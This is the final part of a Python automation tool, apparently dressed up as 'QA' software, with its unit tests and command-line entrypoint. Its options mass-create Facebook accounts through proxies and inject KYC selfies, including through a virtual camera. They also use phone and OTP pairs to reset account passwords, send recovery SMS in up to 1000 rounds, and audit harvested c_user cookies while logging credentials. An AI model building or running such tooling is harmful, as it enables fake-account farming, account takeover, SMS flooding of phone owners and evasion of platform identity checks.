    if os.path.isfile("test_accounts_output.txt"): os.remove("test_accounts_output.txt")
    assert_test("Secure Credential File Persistence", saved_ok)

    # Test 9: Zombie Process Cleaner
    kill_zombie_browsers()
    assert_test("Zombie Browser Process Cleaner Execution", True)

    # Test 10: 24-digit phone candidate rejection
    assert_test("Long Invalid Number Rejection (24-digit string)", not is_valid_phone_candidate("880145692014301764513491"))

    # Test 11: Recovery Pair Extraction (Phone-OTP, OTP-Phone, Multi-OTP)
    sample_pairs = "+393300962475 699632\n699633 +12025550188 699634"
    parsed_pairs = smart_extract_reset_pairs(sample_pairs)
    assert_test("Recovery Pair Extraction (Phone-OTP, OTP-Phone, Multi-OTP)",
                len(parsed_pairs) == 2 and parsed_pairs[0]["phone"] == "+393300962475" and "699632" in parsed_pairs[0]["otps"])

    # Test 12: Facebook Recovery Engine Dry-Run Verification (Option 5)
    reco_cfg = {
        "action": "reset_account",
        "mode": "instant",
        "dry_run": True,
        "pairs": [{"phone": "+393300962123", "otps": ["699632"]}],
        "password": "TestPassword123!"
    }
    reco_res = asyncio.run(FacebookRecoveryEngine(reco_cfg, EventBus()).execute_recovery_task(1, 1, reco_cfg["pairs"][0]))
    assert_test("Facebook Recovery Engine Dry-Run Verification (Option 5)", "RECOVERY DONE" in reco_res.get("status", ""))

    # Test 13: Reset OTP Engine Dry-Run Verification (Option 6)
    reco_otp_cfg = {
        "action": "reset_otp",
        "mode": "instant",
        "dry_run": True,
        "pairs": [{"phone": "+393300962123", "otps": []}]
    }
    reco_otp_res = asyncio.run(FacebookRecoveryEngine(reco_otp_cfg, EventBus()).execute_recovery_task(1, 1, reco_otp_cfg["pairs"][0]))
    assert_test("Reset OTP Engine Dry-Run Verification (Option 6)", "RECO SMS SENT" in reco_otp_res.get("status", ""))

    # Test 14: 8-digit OTP and reversed order extraction
    rev_sample = "12345678 393300962475 699632"
    rev_pairs = smart_extract_reset_pairs(rev_sample)
    assert_test("Order-Independent Extraction with 8-digit OTP (OTP before phone)",
                len(rev_pairs) == 1 and rev_pairs[0]["phone"] == "393300962475" and "12345678" in rev_pairs[0]["otps"] and "699632" in rev_pairs[0]["otps"])

    # Test 15: Multi-OTP ingestion bounded to 10 OTPs
    multi_sample = "+393300962475 " + " ".join([f"69963{i}" for i in range(15)])
    multi_pairs = smart_extract_reset_pairs(multi_sample)
    assert_test("Multi-OTP Ingestion Capped at 10 OTPs per Phone",
                len(multi_pairs) == 1 and len(multi_pairs[0]["otps"]) == 10)

    # Test 16: Realtime Debug Logger Verification
    write_runtime_log("INFO", "UNIT_TEST", "Realtime diagnostic stream assertion.")
    log_exists = os.path.isfile(RUNTIME_DEBUG_LOG) and "Realtime diagnostic stream assertion." in open(RUNTIME_DEBUG_LOG, encoding="utf-8", errors="ignore").read()
    assert_test("Realtime Debug File Persistence (runtime_debug.log)", log_exists)

    # Test 17: In-Place Reco SMS Increment (1x -> 2x) & Duplicate Prevention
    test_phone = f"+393300{random.randint(100000, 999999)}"
    c1 = smart_update_reco_sms(test_phone, "RECO SMS SENT ✅")
    c2 = smart_update_reco_sms(test_phone, "RECO SMS SENT ✅")
    with open("reco_sms.txt", "r", encoding="utf-8") as f:
        reco_content = f.read()
    occurrences = reco_content.count(test_phone.lstrip("+"))
    assert_test("In-Place Reco SMS Increment & Single Record Invariant", c1 == 1 and c2 == 2 and occurrences == 1 and f"2x to ({test_phone})" in reco_content)

    # Test 18: Single-Line Cookie Ellipsis Formatter
    long_cookie = "datr=AbCdEfGhIjKlMnOpQrStUvWxYz1234567890; c_user=615123456789012; xs=very_long_secret_token_value_abc; fr=another_cookie_value"
    formatted_ck = _format_cookies_single_line(long_cookie, max_len=30)
    assert_test("Single-Line Cookie Ellipsis Formatter", "\n" not in formatted_ck and formatted_ck.endswith("...") and len(formatted_ck) <= 33)

    # Test 19: Granular Proxy Routing Persistence
    cfg_test = SettingsManager.load()
    cfg_test.setdefault("proxy_routing", {})["opt5"] = "before_otp_random"
    SettingsManager.save(cfg_test)
    reloaded_cfg = SettingsManager.load()
    assert_test("Granular Proxy Routing Persistence in settings.json", reloaded_cfg.get("proxy_routing", {}).get("opt5") == "before_otp_random")

    # Test 20: Recovery Multi-Round Dispatch Engine Execution
    reco_multi_cfg = {
        "action": "reset_otp",
        "mode": "ultra",
        "dry_run": True,
        "pairs": [{"phone": "+393300888888", "otps": []}],
        "reco_rounds": 2
    }
    multi_res = asyncio.run(run_recovery_batch_pipeline_async(reco_multi_cfg))
    assert_test("Multi-Round Recovery Batch Pipeline Execution", multi_res is None or isinstance(multi_res, dict))

    # Test 21: Hybrid Pipeline Configuration Invariants
    hybrid_cfg = {
        "action": "hybrid_create_and_reco",
        "mode": "ultra",
        "endpoint": "limited",
        "contact_mode": "phone",
        "count": 1,
        "reco_rounds": 3,
        "dry_run": True
    }
    hybrid_res = asyncio.run(run_hybrid_batch_pipeline_async(hybrid_cfg))
    assert_test("Hybrid Mode Orchestration (Phone Creation + Option 6 Dispatch)", hybrid_res is None or isinstance(hybrid_res, dict))

    # Test 22: Ultra Mode Browser Reuse & Teardown Interface
    engine_ultra = EYDHMAutomationEngine({"mode": "ultra"}, EventBus())
    engine_ultra.close()
    assert_test("Ultra Mode Engine Clean Teardown Interface", engine_ultra.persistent_driver is None)

    # Test 23: Registration DOM Error Diagnostics Classifier
    class MockElement:
        def __init__(self, text="", displayed=True):
            self.text = text
            self._displayed = displayed
        def is_displayed(self):
            return self._displayed

    class MockRegDriver:
        def __init__(self, body_text="", current_url="https://limited.facebook.com/reg", alert_text=""):
            self._body = body_text
            self.current_url = current_url
            self._alert_text = alert_text
            self.page_source = body_text

        def find_element(self, by, val):
            return MockElement(self._body)

        def find_elements(self, by, val):
            if "alert" in val or "error" in val:
                if self._alert_text:
                    return [MockElement(self._alert_text)]
            return []

    mock_engine = EYDHMAutomationEngine({"mode": "instant"}, EventBus())
    d_inv_phone = MockRegDriver(body_text="Please enter a valid mobile number")
    err_res1 = mock_engine._detect_registration_dom_errors(d_inv_phone, "+260754843364")
    d_fail_create = MockRegDriver(body_text="We couldn't create your account. Please try again later.")
    err_res2 = mock_engine._detect_registration_dom_errors(d_fail_create, "+260754843364")
    d_rate_limit = MockRegDriver(body_text="You're temporarily blocked from creating accounts.")
    err_res3 = mock_engine._detect_registration_dom_errors(d_rate_limit, "+260754843364")

    assert_test("Registration DOM Error Diagnostics Classifier (Invalid Phone, Generic Fail, Rate Limit)",
                err_res1 is not None and err_res1[0] == "INVALID PHONE ⚠️" and
                err_res2 is not None and "CREATION FAILED" in err_res2[0] and
                err_res3 is not None and "RATE LIMITED" in err_res3[0])

    # Test 24: Valid c_user Live Graph Audit Liveness Verification
    c_live, c_live_msg = LivenessChecker.audit_c_user("4")
    assert_test("Live Graph Audit Verification on Valid Created c_user",
                (c_live is True and "Active" in c_live_msg) or ("Network Error" in c_live_msg) or ("Profile Routing" in c_live_msg))

    # Test 25: Smart c_user Extraction (JSON, Delimiters, Cookies, Timestamps filtered)
    sample_mixed_cusers = (
        'datr=test_123; c_user=61595607657979; xs=456\n'
        '[{"name": "c_user", "value": "100088918237123"}]\n'
        'USER ID : 615254479981, 61595607657979, 20261019'
    )
    extracted_uids = smart_extract_cusers_from_source(sample_mixed_cusers)
    assert_test("Smart c_user Extraction (JSON, Cookies, Delimiters, Timestamp Exclusion)",
                "61595607657979" in extracted_uids and
                "100088918237123" in extracted_uids and
                "615254479981" in extracted_uids and
                "20261019" not in extracted_uids and
                len(extracted_uids) == 3)

    # Test 26: Liveness Batch Audit Pipeline Execution & File Reporting
    t_out_live = "test_live_checked.txt"
    if os.path.isfile(t_out_live): os.remove(t_out_live)
    b_results, b_summary = LivenessChecker.audit_cusers_batch(
        cusers=["61595607657979", "100088918237123"],
        output_file=t_out_live,
        dry_run=True
    )
    file_exists_and_populated = os.path.isfile(t_out_live) and os.path.getsize(t_out_live) > 50
    if os.path.isfile(t_out_live): os.remove(t_out_live)
    assert_test("Liveness Batch Audit Execution & Structured File Logging",
                len(b_results) == 2 and b_summary["total"] == 2 and file_exists_and_populated)

    # Test 27: Smart Mixed Input Ingestion (File Path + Direct c_users simultaneously)
    tmp_cuser_file = "temp_test_cusers.txt"
    try:
        with open(tmp_cuser_file, "w", encoding="utf-8") as f:
            f.write("615111222333\n615444555666\n")
        mixed_input_cusers = f"615999888777, {tmp_cuser_file}, 615000111222"
        extracted_mixed = smart_extract_cusers_from_source(mixed_input_cusers)
        assert_test("Smart Mixed c_user Ingestion (File Path + Direct Tokens)",
                    "615999888777" in extracted_mixed and
                    "615111222333" in extracted_mixed and
                    "615444555666" in extracted_mixed and
                    "615000111222" in extracted_mixed and
                    len(extracted_mixed) == 4)
    finally:
        if os.path.isfile(tmp_cuser_file): os.remove(tmp_cuser_file)

    # Test 28: Smart Mixed Phone Ingestion (File Path + Direct phones simultaneously)
    tmp_phone_file = "temp_test_phones.txt"
    try:
        with open(tmp_phone_file, "w", encoding="utf-8") as f:
            f.write("+393791112233\n+393794445566\n")
        mixed_input_phones = f"+393799998877, {tmp_phone_file}, +393790001122"
        extracted_phones = smart_extract_phones_from_source(mixed_input_phones)
        assert_test("Smart Mixed Phone Ingestion (File Path + Direct Numbers)",
                    "+393799998877" in extracted_phones and
                    "+393791112233" in extracted_phones and
                    "+393794445566" in extracted_phones and
                    "+393790001122" in extracted_phones and
                    len(extracted_phones) == 4)
    finally:
        if os.path.isfile(tmp_phone_file): os.remove(tmp_phone_file)

    # Test 29: Destination Phone Verification Pattern (Last 2 digits matching vs mismatch)
    test_otp_body_match = "We've sent your code to:\n+**********72\nPlease enter the 6-digit code."
    test_otp_body_mismatch = "We've sent your code to:\n+**********10\nPlease enter the 6-digit code."
    m_match = re.findall(r"(?:\+|(?<=\s))[\*•xX]{2,}(\d{2})\b", test_otp_body_match)
    m_mismatch = re.findall(r"(?:\+|(?<=\s))[\*•xX]{2,}(\d{2})\b", test_otp_body_mismatch)
    target_last2 = "72"
    assert_test("Destination Phone Ending Digits Regex & Mismatch Classifier",
                bool(m_match and m_match[0] == target_last2 and m_mismatch and m_mismatch[0] != target_last2))

    # Test 30: Smart Mixed Recovery Pairs Ingestion (File Path + Direct Pairs simultaneously)
    tmp_pairs_file = "temp_test_pairs.txt"
    try:
        with open(tmp_pairs_file, "w", encoding="utf-8") as f:
            f.write("+393300111222 112233\n+393300333444 445566\n")
        mixed_input_pairs = f"+393300555666 778899, {tmp_pairs_file}, +393300999000 001122"
        extracted_pairs = smart_extract_reset_pairs(mixed_input_pairs)
        pair_phones = [p["phone"] for p in extracted_pairs]
        assert_test("Smart Mixed Recovery Pairs Ingestion (File Path + Direct Pairs)",
                    "+393300555666" in pair_phones and
                    "+393300111222" in pair_phones and
                    "+393300333444" in pair_phones and
                    "+393300999000" in pair_phones and
                    len(extracted_pairs) == 4)
    finally:
        if os.path.isfile(tmp_pairs_file): os.remove(tmp_pairs_file)

    # Test 31: GlobalInputStash Buffer & Auto-Forwarding Interface
    GlobalInputStash.set("+260755946719 +260755946245")
    stashed_val = GlobalInputStash.pop()
    stashed_phones = smart_extract_phones_from_source(stashed_val) if stashed_val else []
    assert_test("GlobalInputStash Buffer & Menu Auto-Forwarding Invariant",
                len(stashed_phones) == 2 and "+260755946719" in stashed_phones and GlobalInputStash.peek() is None)

    # Test 32: Direct Registration DOM Fallback Resolution Mechanism
    engine_test = EYDHMAutomationEngine({"mode": "ultra"}, EventBus())
    assert_test("Registration State Machine Instant and Ultra JS Invariant",
                engine_test.mode in ("instant", "ultra"))

    # Test 33: Resilient DOM Body Text & URL Extraction Invariant
    class FlakyDriver:
        def __init__(self):
            self.call_count = 0
        @property
        def current_url(self):
            raise Exception("Message: no such execution context")
        def execute_script(self, script, *args):
            if "location.href" in script:
                return "https://limited.facebook.com/reg"
            if "innerText" in script:
                return "Agree to Facebook terms and policies"
            return None
        def find_element(self, by, val):
            raise Exception("no such element: Unable to locate element: body")

    flaky_d = FlakyDriver()
    safe_txt = get_safe_body_text(flaky_d)
    safe_url = get_safe_current_url(flaky_d)
    none_txt = get_safe_body_text(None)
    none_url = get_safe_current_url(None)
    assert_test("Resilient DOM Body Text & URL Exception Recovery",
                safe_txt == "Agree to Facebook terms and policies" and
                safe_url == "https://limited.facebook.com/reg" and
                none_txt == "" and none_url == "")

    # Test 34: Post-Submission Interactive Barriers & Step 6 Terms Dispatcher
    class MockBarrierElement:
        def __init__(self, text="I Agree"):
            self.text = text
            self.clicked = False
        def is_displayed(self):
            return True
        def get_attribute(self, attr):
            return ""

    class MockBarrierDriver:
        def __init__(self):
            self.btn = MockBarrierElement("I Agree")
            self.current_url = "https://limited.facebook.com/reg"
        def execute_script(self, script, *args):
            if "innerText" in script:
                return "Finish signing up. Tap I agree to create account."
            if "click" in script and args:
                self.btn.clicked = True
            return None
        def find_elements(self, by, val):
            if "AGREE" in val or "agree" in val:
                return [self.btn]
            return []

    barrier_driver = MockBarrierDriver()
    barrier_engine = EYDHMAutomationEngine({"mode": "instant"}, EventBus())
    barrier_action = barrier_engine._sweep_post_submission_barriers(barrier_driver)
    assert_test("Post-Submission Barrier Dispatcher (Step 6 Terms & Agreement)",
                barrier_action is True and barrier_driver.btn.clicked is True)

    # Test 35: Multilingual SMS Radio & Masked Ending Digits Matching (e.g. Italian 393760167315 -> 15)
    class MockRadioElement:
        def __init__(self, text, attrs=None):
            self.text = text
            self.attrs = attrs or {}
        def get_attribute(self, attr):
            return self.attrs.get(attr, "")

    class MockRadioDriver:
        def __init__(self, items):
            self.items = items
        def find_elements(self, by, val):
            return []

    r_it_wa = MockRadioElement("Invia codice tramite WhatsApp", {"value": "send_whatsapp"})
    r_it_sms = MockRadioElement("Ricevi codice tramite SMS: +******15", {"value": "send_sms"})
    d_mock_rad = MockRadioDriver([r_it_wa, r_it_sms])
    ctx_wa = _extract_radio_context(d_mock_rad, r_it_wa)
    ctx_sms = _extract_radio_context(d_mock_rad, r_it_sms)
    target_last2 = "15"
    sms_kw = ["sms", "text", "phone", "mobile", "messaggio", "cellulare", "telefono", "testo"]
    matched_sms = (
        ("whatsapp" not in ctx_sms and "wa.me" not in ctx_sms) and
        (target_last2 in ctx_sms and ("@" not in ctx_sms and "email" not in ctx_sms)) and
        any(k in ctx_sms for k in sms_kw)
    )
    assert_test("Multilingual SMS Radio & Ending Digits Matcher (Italian Phone 393760167315 -> 15)", matched_sms)

    # Test 36: Zero-Success Batch Verdict Panel Invariant (No 'Successful: 0' display)
    sample_zero_success = [
        {"index": 1, "status": "SMS OPTION UNAVAILABLE ⚠️", "phone": "393760167315", "time_taken": 24.38, "diagnostics": "No matching SMS recovery radio found."}
    ]
    succ_count = len([r for r in sample_zero_success if "SENT" in r["status"] or "DONE" in r["status"]])
    v_text = (
        f"All {len(sample_zero_success)} items failed / unresolved ❌"
        if succ_count == 0 else
        f"Total Items: {len(sample_zero_success)} · Successful: {succ_count}"
    )
    assert_test("Zero-Success Batch Verdict Panel Formatting Invariant",
                succ_count == 0 and "Successful" not in v_text and "All 1 items failed" in v_text)

    print(f"\n   {G1}{C_BOLD}Result: {passes}/{total} tests passed ({round(passes/total*100, 1)}%){C_RESET}\n")
    return passes == total


# ==============================================================================
# CLI Arguments Parser & Main Entrypoint
# ==============================================================================

def main():
    parser = argparse.ArgumentParser(
        description="EYDHM :: Enterprise E2E User-Onboarding QA Automation & Resilience Engine",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument("--count", type=int, default=None, help="Total accounts to provision.")
    parser.add_argument("--mode", type=str, default=None, choices=["ultra", "instant", "fast", "normal"], help="Speed tier.")
    parser.add_argument("--endpoint", type=str, default=None, help="Target endpoint profile (limited, web, mobile, mbasic, free, beta, dev, or custom URL).")
    parser.add_argument("--contact-mode", type=str, default=None, choices=["email", "email_90", "phone"], help="Contact verification method.")
    parser.add_argument("--contact-source", "--phone-source", "--phones", type=str, default=None, help="Batch string or file path containing phone numbers or emails.")
    parser.add_argument("--selfie", type=str, default=None, help="Local file/folder or remote URL for KYC appeal photo.")
    parser.add_argument("--media-method", type=str, default="file_upload", choices=["file_upload", "virtual_camera"], help="Media injection method.")
    parser.add_argument("--proxy", type=str, default=None, help="Proxy credentials or list file.")
    parser.add_argument("-p", "--password", type=str, default=None, help="Password (min 6 characters).")
    parser.add_argument("--delay", type=float, default=None, help="Inter-run delay in seconds.")
    parser.add_argument("--ws-port", type=int, default=8765, help="Port for local WebSocket telemetry server.")
    parser.add_argument("--headless", action="store_true", default=False, help="Force headless browser execution.")
    parser.add_argument("--dry-run", action="store_true", default=False, help="Simulate DOM execution without launching browser.")
    parser.add_argument("--test", action="store_true", default=False, help="Run comprehensive unit test protocol.")
    parser.add_argument("--check-logs", action="store_true", default=False, help="Audit c_user liveness on phone_accounts.txt.")
    parser.add_argument("--check-live", "--check-cuser", dest="check_live", nargs="?", const="phone_accounts.txt", default=None, help="Audit c_user liveness on string, file, or log (Option 8).")
    parser.add_argument("-o", "--output", type=str, default="phone_accounts.txt", help="Output credentials log path.")

    # Reset, Recovery & Hybrid Options
    parser.add_argument("--reset-account", action="store_true", default=False, help="Launch Facebook Account Recovery mode (Option 5).")
    parser.add_argument("--reset-otp", action="store_true", default=False, help="Launch Facebook Reset OTP dispatch mode (Option 6).")
    parser.add_argument("--hybrid", action="store_true", default=False, help="Launch Hybrid Mode: Phone Create 90%% + Option 6 Reset OTP Dispatch (Option 7).")
    parser.add_argument("--reco-rounds", type=int, default=1, help="Total recovery OTP dispatch rounds (1-1000).")
    parser.add_argument("--resend-multiplier", "--resend-otp", type=int, default=1, help="Total SMS OTP confirmation resends (1-1000, default 1).")
    parser.add_argument("--pairs", "--reset-source", type=str, default=None, help="Phone + OTP pairs string or file path for recovery.")

    # Speed Tier Shortcuts
    parser.add_argument("--ultra", action="store_true", help="Shortcut for --mode ultra (Fastest persistent session, cookie wipe).")
    parser.add_argument("--instant", action="store_true", help="Shortcut for --mode instant.")
    parser.add_argument("--fast", action="store_true", help="Shortcut for --mode fast.")
    parser.add_argument("--normal", action="store_true", help="Shortcut for --mode normal.")

    args = parser.parse_args()

    if args.test:
        render_eydhm_banner(subtitle="INTERNAL QA VALIDATION PROTOCOL")
        success = run_unit_tests()
        sys.exit(0 if success else 1)

    if args.check_logs:
        LivenessChecker.audit_log_file(args.output)
        return

    if args.check_live:
        target_in = args.check_live
        cusers = smart_extract_cusers_from_source(target_in)
        if not cusers and os.path.isfile("phone_accounts.txt"):
            cusers = smart_extract_cusers_from_source("phone_accounts.txt")
        if not cusers and args.dry_run:
            cusers = ["61595607657979", "100088918237123"]
        if not cusers:
            print(f"\n{ROSE}[!] ERROR: No valid c_user IDs found to audit from '{target_in}'.{C_RESET}", file=sys.stderr)
            sys.exit(1)
        cfg = {
            "action": "check_live_accounts",
            "cusers": cusers,
            "count": len(cusers),
            "output": args.output if args.output != "phone_accounts.txt" else "live_checked_accounts.txt",
            "dry_run": args.dry_run
        }
        run_live_check_pipeline(cfg)
        return

    # If no flags passed, launch interactive CLI wizard with non-terminating loop
    if len(sys.argv) == 1:
        while True:
            config = interactive_wizard()
            if not config:
                break

            curr_config = config
            while curr_config is not None:
                render_eydhm_banner()
                act = curr_config.get("action", "")
                if act in ("reset_account", "reset_otp"):
                    curr_config = asyncio.run(run_recovery_batch_pipeline_async(curr_config))
                elif act == "hybrid_create_and_reco":
                    curr_config = asyncio.run(run_hybrid_batch_pipeline_async(curr_config))
                elif act == "check_live_accounts":
                    curr_config = run_live_check_pipeline(curr_config)
                else:
                    curr_config = asyncio.run(run_batch_pipeline_async(curr_config))
        return

    settings = SettingsManager.load()

    selected_mode = args.mode or settings.get("default_mode", "ultra")
    if args.ultra: selected_mode = "ultra"
    elif args.instant: selected_mode = "instant"
    elif args.fast: selected_mode = "fast"
    elif args.normal: selected_mode = "normal"

    pwd = args.password or settings.get("default_password")
    if pwd is not None and len(pwd) < 6:
        print(f"\n{ROSE}[!] ERROR: Password must have at least 6 characters.{C_RESET}", file=sys.stderr)
        while True:
            try:
                reentered = input(f"{AMBER}[-] Enter a valid password (6+ chars): {C_RESET}").strip()
            except (EOFError, KeyboardInterrupt): sys.exit(1)
            if len(reentered) >= 6:
                pwd = reentered; break

    # Hybrid Action Execution Branch (Option 7 CLI)
    if args.hybrid:
        contact_src = args.contact_source
        run_count = max(1, args.count) if args.count else 1
        if contact_src:
            extracted = smart_extract_phones_from_source(contact_src)
            if extracted and not args.count:
                run_count = len(extracted)

        config = {
            "action": "hybrid_create_and_reco",
            "endpoint": args.endpoint or settings.get("default_endpoint", "limited"),
            "mode": selected_mode,
            "contact_mode": "phone",
            "contact_source": contact_src,
            "count": run_count,
            "resend_multiplier": max(1, args.resend_multiplier),
            "reco_rounds": max(1, args.reco_rounds),
            "password": pwd,
            "proxy": args.proxy or settings.get("proxy"),
            "selfie": args.selfie or settings.get("kyc_image_url", DEFAULT_SELFIE_URL),
            "media_method": args.media_method,
            "delay": args.delay if args.delay is not None else settings.get("delay", 1.0),
            "ws_port": args.ws_port,
            "headless": args.headless or (selected_mode in ("ultra", "instant")) or (not os.environ.get("DISPLAY") and not os.environ.get("WAYLAND_DISPLAY")),
            "output": args.output or "phone_accounts.txt",
            "dry_run": args.dry_run
        }
        render_eydhm_banner()
        asyncio.run(run_hybrid_batch_pipeline_async(config))
        return

    # Recovery Action Execution Branch (Options 5 & 6 CLI)
    if args.reset_account or args.reset_otp:
        action = "reset_account" if args.reset_account else "reset_otp"
        source_in = args.pairs or args.contact_source
        pairs = []
        if action == "reset_account":
            if source_in:
                pairs = smart_extract_reset_pairs(source_in)
            if not pairs and os.path.isfile("reset_acc.txt"):
                pairs = smart_extract_reset_pairs("reset_acc.txt")
        else:
            phones = []
            if source_in:
                phones = smart_extract_phones_from_source(source_in)
            if not phones and os.path.isfile("phone.txt"):
                phones = smart_extract_phones_from_source("phone.txt")
            pairs = [{"phone": p, "otps": []} for p in phones]

        if not pairs and args.dry_run:
            if action == "reset_account":
                pairs = [{"phone": "+393300962123", "otps": ["699632"]}]
            else:
                pairs = [{"phone": "+393300962123", "otps": []}]

        if not pairs:
            print(f"\n{ROSE}[!] ERROR: No valid recovery targets provided for {action}.{C_RESET}", file=sys.stderr)
            sys.exit(1)

        config = {
            "action": action,
            "endpoint": args.endpoint or settings.get("default_endpoint", "limited"),
            "mode": selected_mode,
            "pairs": pairs,
            "count": len(pairs),
            "reco_rounds": max(1, args.reco_rounds),
            "password": pwd,
            "proxy": args.proxy or settings.get("proxy"),
            "delay": args.delay if args.delay is not None else settings.get("delay", 1.0),
            "ws_port": args.ws_port,
            "headless": args.headless or (selected_mode in ("ultra", "instant")) or (not os.environ.get("DISPLAY") and not os.environ.get("WAYLAND_DISPLAY")),
            "output": "successful_recovery.txt" if action == "reset_account" else "reco_sms.txt",
            "dry_run": args.dry_run
        }
        render_eydhm_banner()
        asyncio.run(run_recovery_batch_pipeline_async(config))
        return

    contact_src = args.contact_source
    run_count = max(1, args.count) if args.count else 1
    if contact_src:
        extracted = smart_extract_phones_from_source(contact_src)
        if extracted and not args.count:
            run_count = len(extracted)

    config = {
        "count": run_count,
        "mode": selected_mode,
        "endpoint": args.endpoint or settings.get("default_endpoint", "limited"),
        "contact_mode": args.contact_mode or "phone",
        "contact_source": contact_src,
        "resend_multiplier": max(1, args.resend_multiplier),
        "selfie": args.selfie or settings.get("kyc_image_url", DEFAULT_SELFIE_URL),
        "media_method": args.media_method,
        "proxy": args.proxy or settings.get("proxy"),
        "password": pwd,
        "delay": args.delay if args.delay is not None else settings.get("delay", 1.0),
        "ws_port": args.ws_port,
        "headless": args.headless or (selected_mode in ("ultra", "instant")) or (not os.environ.get("DISPLAY") and not os.environ.get("WAYLAND_DISPLAY")),
        "output": args.output,
        "dry_run": args.dry_run
    }

    render_eydhm_banner()
    asyncio.run(run_batch_pipeline_async(config))


if __name__ == "__main__":
    main()
